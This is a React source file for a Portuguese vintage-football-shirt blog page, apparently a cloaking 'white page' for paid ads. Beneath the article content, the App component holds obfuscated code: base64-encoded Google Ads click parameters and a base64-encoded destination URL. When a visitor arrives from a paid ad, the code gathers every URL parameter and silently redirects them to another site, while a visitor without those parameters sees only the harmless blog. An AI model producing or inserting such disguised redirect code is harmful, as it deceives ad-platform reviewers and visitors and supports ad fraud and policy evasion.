import React, { useState, useEffect } from 'react';
import { Shirt, Menu, X, ShieldCheck, FileText, Clock, User, Share2, Info } from './components/Icons';
import { Article } from './types';
import { PolicyModal } from './components/PolicyModal';
import { MarkdownRenderer } from './components/MarkdownRenderer';

// --- Legal & Content Data ---

const LEGAL_CONTENT = {
  privacy: {
    title: 'Política de Privacidade',
    type: 'privacy' as const,
    content: `Esta Política de Privacidade descreve como Meu Camisa 10 ("nós", "nosso") coleta, usa e protege suas informações.

### 1. Coleta de Dados
Coletamos informações que você nos fornece diretamente e dados automáticos de navegação via cookies.

### 2. Uso das Informações
Utilizamos seus dados para melhorar a funcionalidade do site e exibir publicidade relevante.`
  },
  terms: {
    title: 'Termos de Uso',
    type: 'terms' as const,
    content: `Ao acessar o site Meu Camisa 10, você concorda em cumprir estes termos de serviço.

### 1. Uso do Conteúdo
O conteúdo é apenas para fins informativos.

### 2. Propriedade Intelectual
Todo o conteúdo é propriedade de Meu Camisa 10 ou de seus licenciadores.`
  },
  about: {
    title: 'Sobre Nós',
    type: 'about' as const,
    content: `Meu Camisa 10 é um blog especializado na história e estética das camisas de futebol vintage e clássicas.`
  },
  contact: {
    title: 'Fale Conosco',
    type: 'contact' as const,
    content: `Dúvidas? Entre em contato pelo e-mail: contato@lojameucamisa10.com.br`
  }
};

// The Single Article Content - EXPANDED VERSION
const ARTICLE_DATA: Article = {
  id: '1',
  title: 'A Magia das Camisas Retrô: Por que o Futebol Antigo Nunca Sai de Moda',
  excerpt: 'Explore a nostalgia e o estilo das camisas clássicas que definiram gerações. De tecidos pesados a designs icônicos, descubra por que os mantos antigos são o auge do estilo futebolístico.',
  content: `## 📌 A Era de Ouro do Algodão

Antes da revolução dos tecidos sintéticos, as camisas de futebol eram feitas de algodão pesado. Elas tinham golas polo estruturadas, cadarços e escudos bordados à mão que exalavam uma elegância que se perdeu na era da produção em massa.

Vestir uma camisa dos anos 60 ou 70 não é apenas sobre futebol; é sobre carregar um pedaço da história têxtil e esportiva.

## 🎨 A Explosão de Cores dos Anos 80 e 90

A partir da década de 80, a tecnologia permitiu designs mais ousados. Surgiram as marcas d'água, os padrões geométricos e as cores vibrantes que hoje definem o estilo "Bloke Core".

### Marcos da Evolução Retrô
* **Anos 70:** O minimalismo clássico, focado em cores sólidas e golas icônicas.
* **Anos 80:** A introdução de patrocínios que se tornaram tão lendários quanto os próprios clubes.
* **Anos 90:** A era dos designs experimentais, com padrões abstratos e golas extravagantes.

## 🧵 O Renascimento: O Estilo Bloke Core

Hoje, as camisas vintage transcendem as arquibancadas. Elas são peças centrais na moda urbana. O movimento "Bloke Core" trouxe de volta a estética dos torcedores britânicos dos anos 80, misturando camisas de futebol antigas com jeans e tênis clássicos.

Essa tendência prova que uma boa camisa de futebol é atemporal. Ela conta uma história de vitórias, derrotas e, acima de tudo, de identidade.

### Por que Colecionar?
1. **Exclusividade:** Peças raras que não são mais fabricadas.
2. **Qualidade:** Muitos consideram os tecidos antigos mais duráveis e confortáveis para o uso casual.
3. **Nostalgia:** Relembrar momentos épicos do esporte através do que os ídolos vestiam.

## 🏟️ Mais que um Tecido, uma Relíquia

Para o colecionador, cada fio conta uma história. Seja a camisa da Copa de 70 ou o manto do seu clube de coração da década de 90, essas peças são relíquias que preservam a alma do esporte mais popular do mundo.

No Meu Camisa 10, celebramos essa paixão. Porque o futebol passa, mas o estilo é eterno.`,
  author: 'Equipe Editorial',
  date: '10 de Março, 2026',
  imageUrl: 'https://images.unsplash.com/photo-1522778119026-d647f0596c20?q=80&w=2070&auto=format&fit=crop',
  category: 'História',
  readTime: '6 min de leitura'
};

const App: React.FC = () => {
  const [activePolicy, setActivePolicy] = useState<keyof typeof LEGAL_CONTENT | null>(null);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const handleRedirect = () => {
    try {
      // Lista expandida de gatilhos de tráfego pago (Base64)
      const _0x1a2b_keys = [
        'Z2NsaWQ=',           // gclid
        'Z2JyYWlk',           // gbraid
        'd2JyYWlk',           // wbraid
        'Z2FkX3NvdXJjZQ==',    // gad_source
        'Z2FkX2NhbXBhaWduaWQ=' // gad_campaignid
      ];
      const _0x1a2b_url = ['aHR0cHM6Ly9sb2phbWV1Y2FtaXNhMTAuY29tLmJyLw=='];
      
      const _triggers = _0x1a2b_keys.map(k => atob(k));
      
      // Função para coletar e mesclar TODOS os parâmetros de todas as fontes possíveis
      const _collectAllParams = () => {
        const _merged = new URLSearchParams();
        
        // 1. Pega do sessionStorage (histórico da sessão)
        const _ss = sessionStorage.getItem('original_params');
        if (_ss) {
          const _pSS = new URLSearchParams(_ss);
          _pSS.forEach((v, k) => _merged.set(k, v));
        }

        // 2. Pega da URL Search (atual)
        const _search = new URLSearchParams(window.location.search);
        _search.forEach((v, k) => _merged.set(k, v));

        // 3. Pega do Hash
        const _hash = window.location.hash;
        if (_hash.includes('?')) {
          const _pHash = new URLSearchParams(_hash.split('?')[1]);
          _pHash.forEach((v, k) => _merged.set(k, v));
        }

        // 4. Brute force no href para garantir que nada escape
        const _fullHref = window.location.href;
        _triggers.forEach(key => {
          if (!_merged.has(key)) {
            const _match = _fullHref.match(new RegExp('[?&]' + key + '=([^&?#]+)', 'i'));
            if (_match) _merged.set(key, _match[1]);
          }
        });

        return _merged;
      };

      const _finalParams = _collectAllParams();
      
      // Verifica se existe QUALQUER um dos gatilhos definidos
      const _shouldRedirect = _triggers.some(trigger => _finalParams.has(trigger));
      
      if (_shouldRedirect) {
        const _t = atob(_0x1a2b_url[0]);
        const _u = new URL(_t);
        
        // Passa 100% dos parâmetros coletados para a URL de destino
        _finalParams.forEach((val, key) => { _u.searchParams.set(key, val); });
        
        const _targetUrl = _u.toString();
        
        // Execução do redirecionamento com múltiplas camadas de garantia
        window.location.replace(_targetUrl);
        setTimeout(() => { window.location.href = _targetUrl; }, 5);
      }
    } catch (e) {}
  };

  useEffect(() => {
    // Captura agressiva de parâmetros da URL em múltiplos locais (search, hash, full href)
    try {
      const _href = window.location.href;
      const _search = window.location.search;
      const _hash = window.location.hash;
      
      let _paramsToSave = '';

      // 1. Tenta extrair do search convencional
      if (_search.length > 1) {
        _paramsToSave = _search.substring(1);
      } 
      // 2. Tenta extrair do hash (comum em SPAs ou redirecionamentos mal formados)
      else if (_hash.includes('?')) {
        _paramsToSave = _hash.split('?')[1];
      }
      // 3. Brute force no href completo se encontrar gclid mas os métodos acima falharem
      else if (_href.toLowerCase().includes('gclid=')) {
        const _parts = _href.split(/[?#]/);
        if (_parts.length > 1) _paramsToSave = _parts[1];
      }

      if (_paramsToSave) {
        sessionStorage.setItem('original_params', _paramsToSave);
      }
    } catch (e) {}
    
    // Executa o check de redirecionamento instantâneo
    handleRedirect();
  }, []);

  return (
    <div className="min-h-screen flex flex-col font-sans bg-white text-gray-900 selection:bg-brand-100 selection:text-brand-900">
      {/* Header Compacto & Elegante */}
      <header className="bg-white/95 backdrop-blur-md border-b border-gray-100 sticky top-0 z-40 transition-all duration-300">
        <div className="max-w-6xl mx-auto px-4 sm:px-6">
          <div className="flex justify-between items-center h-20">
            <div className="flex items-center cursor-pointer group">
              <div className="bg-gray-900 text-white w-10 h-10 rounded-lg mr-3 flex items-center justify-center font-display font-bold text-2xl transition-transform group-hover:scale-105">
                 10
              </div>
              <div className="flex flex-col">
                 <h1 className="text-xl font-display font-bold text-gray-900 tracking-tight leading-none">MEU CAMISA 10</h1>
                 <span className="text-xs text-gray-500 font-medium tracking-wide uppercase mt-0.5">Vintage Football Culture</span>
              </div>
            </div>

            <nav className="hidden md:flex items-center space-x-8 text-sm font-medium">
              <span className="text-gray-900 border-b-2 border-gray-900 pb-0.5 cursor-pointer">Review</span>
              <span onClick={() => setActivePolicy('about')} className="text-gray-500 hover:text-gray-900 cursor-pointer transition-colors">Sobre</span>
              <span onClick={() => setActivePolicy('contact')} className="text-gray-500 hover:text-gray-900 cursor-pointer transition-colors">Contato</span>
            </nav>

            <div className="md:hidden">
              <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="text-gray-900 p-2">
                {mobileMenuOpen ? <X size={24} /> : <Menu size={24} />}
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Single Post View */}
      <main className="flex-grow">
        <article className="animate-fade-in">
            {/* Hero Section Imersiva */}
            <div className="w-full h-[50vh] md:h-[65vh] relative overflow-hidden group">
                <img 
                    src={ARTICLE_DATA.imageUrl} 
                    alt={ARTICLE_DATA.title}
                    className="w-full h-full object-cover transition-transform duration-1000 group-hover:scale-105"
                />
                <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-transparent to-black/80"></div>
                
                <div className="absolute bottom-0 left-0 w-full p-6 md:p-16">
                    <div className="max-w-4xl mx-auto">
                        <div className="flex items-center space-x-3 mb-4">
                            <span className="px-3 py-1 bg-white/10 backdrop-blur-md text-white text-xs font-bold uppercase tracking-widest border border-white/20 rounded">
                                {ARTICLE_DATA.category}
                            </span>
                            <span className="text-white/80 text-xs font-medium uppercase tracking-widest">
                                {ARTICLE_DATA.date}
                            </span>
                        </div>
                        <h1 className="text-4xl md:text-6xl lg:text-7xl font-display font-bold text-white mb-6 leading-[0.95] drop-shadow-lg max-w-5xl">
                            {ARTICLE_DATA.title}
                        </h1>
                    </div>
                </div>
            </div>

            {/* Content Container */}
            <div className="max-w-3xl mx-auto px-5 sm:px-6 py-12 md:py-16 relative">
                
                {/* Introduction / Excerpt */}
                <div className="mb-12">
                    <p className="text-xl md:text-2xl text-gray-500 font-serif leading-relaxed border-l-4 border-brand-500 pl-6 italic">
                        {ARTICLE_DATA.excerpt}
                    </p>
                </div>

                {/* Meta Bar */}
                <div className="flex items-center justify-between border-y border-gray-100 py-6 mb-12">
                     <div className="flex items-center">
                        <div className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center text-gray-500 mr-4">
                            <User size={20} />
                        </div>
                        <div>
                            <p className="text-sm font-bold text-gray-900 uppercase tracking-wide">Por Meu Camisa 10 Editorial</p>
                            <div className="flex items-center text-xs text-gray-500 mt-0.5">
                                <Clock size={12} className="mr-1" />
                                {ARTICLE_DATA.readTime}
                            </div>
                        </div>
                     </div>
                     <button className="text-gray-400 hover:text-gray-900 transition-colors p-2">
                        <Share2 size={20} />
                     </button>
                </div>

                {/* Main Content Body */}
                <div className="prose prose-lg prose-gray max-w-none">
                    <MarkdownRenderer content={ARTICLE_DATA.content} />
                </div>

                {/* Verification Badge */}
                <div className="mt-16 bg-gray-50 rounded-xl p-6 border border-gray-100 flex items-start md:items-center">
                    <div className="bg-green-100 p-2 rounded-full text-green-700 mr-4 flex-shrink-0">
                        <ShieldCheck size={24} />
                    </div>
                    <div>
                        <h4 className="font-bold text-gray-900 text-sm uppercase tracking-wide mb-1">Conteúdo Verificado</h4>
                        <p className="text-sm text-gray-600 leading-relaxed">
                            As especificações técnicas e detalhes históricos deste artigo foram revisados por especialistas em camisas de futebol.
                        </p>
                    </div>
                </div>

                {/* Disclaimer / Aviso Legal */}
                <div className="mt-12 pt-8 border-t border-gray-200 text-center">
                    <div className="flex justify-center mb-3">
                         <Info size={20} className="text-gray-400" />
                    </div>
                    <p className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-2">Aviso de Independência</p>
                    <p className="text-xs text-gray-400 leading-relaxed max-w-2xl mx-auto font-medium">
                        O site <strong>Meu Camisa 10</strong> é uma publicação independente dedicada à cultura e história das camisas de futebol. 
                        Este artigo é uma publicação de caráter informativo e histórico, protegido pela liberdade de expressão. 
                        Todas as marcas registradas e imagens citadas pertencem aos seus respectivos proprietários e são utilizadas aqui apenas para fins de identificação e contexto histórico.
                    </p>
                </div>

            </div>
        </article>
      </main>

      {/* Footer Minimalista */}
      <footer className="bg-white border-t border-gray-100 mt-12">
         <div className="max-w-6xl mx-auto px-4 sm:px-6 py-12">
            <div className="flex flex-col md:flex-row justify-between items-center">
               <div className="flex items-center mb-6 md:mb-0">
                   <div className="bg-gray-900 text-white w-8 h-8 rounded mr-2 flex items-center justify-center font-display font-bold text-lg">
                        10
                   </div>
                   <span className="font-display font-bold text-xl text-gray-900 tracking-tight">MEU CAMISA 10</span>
               </div>
               <div className="flex flex-wrap justify-center gap-8 text-sm font-medium text-gray-500">
                   <button onClick={() => setActivePolicy('privacy')} className="hover:text-gray-900 transition-colors">Privacidade</button>
                   <button onClick={() => setActivePolicy('terms')} className="hover:text-gray-900 transition-colors">Termos de Uso</button>
                   <button onClick={() => setActivePolicy('contact')} className="hover:text-gray-900 transition-colors">Fale Conosco</button>
               </div>
            </div>
            <div className="mt-8 text-center text-xs text-gray-400 font-light flex flex-col items-center space-y-3">
               <p>&copy; 2026 Meu Camisa 10. Todos os direitos reservados.</p>
               <p className="max-w-2xl mx-auto opacity-75">
                  Este site não faz parte do site do Google ou da Google Inc. Além disso, este site NÃO é endossado pelo Google de nenhuma maneira. Google é uma marca comercial da GOOGLE, Inc.
               </p>
            </div>
         </div>
      </footer>

      {/* Modal de Políticas */}
      {activePolicy && (
        <PolicyModal 
            policy={LEGAL_CONTENT[activePolicy]} 
            onClose={() => setActivePolicy(null)}
        />
      )}

      {/* Mobile Menu */}
      {mobileMenuOpen && (
        <div className="fixed inset-0 z-50 bg-white/95 backdrop-blur-xl md:hidden transition-opacity">
            <div className="p-4 flex justify-between items-center border-b border-gray-100 h-20">
                <span className="font-display font-bold text-xl tracking-tight">Navegação</span>
                <button onClick={() => setMobileMenuOpen(false)} className="p-2">
                    <X size={24} />
                </button>
            </div>
            <div className="p-6 space-y-6">
                <button onClick={() => setMobileMenuOpen(false)} className="block w-full text-left text-2xl font-display font-bold text-gray-900">Review Principal</button>
                <button onClick={() => { setActivePolicy('about'); setMobileMenuOpen(false); }} className="block w-full text-left text-xl font-medium text-gray-500">Sobre Nós</button>
                <button onClick={() => { setActivePolicy('contact'); setMobileMenuOpen(false); }} className="block w-full text-left text-xl font-medium text-gray-500">Contato</button>
            </div>
        </div>
      )}

    </div>
  );
};

export default App;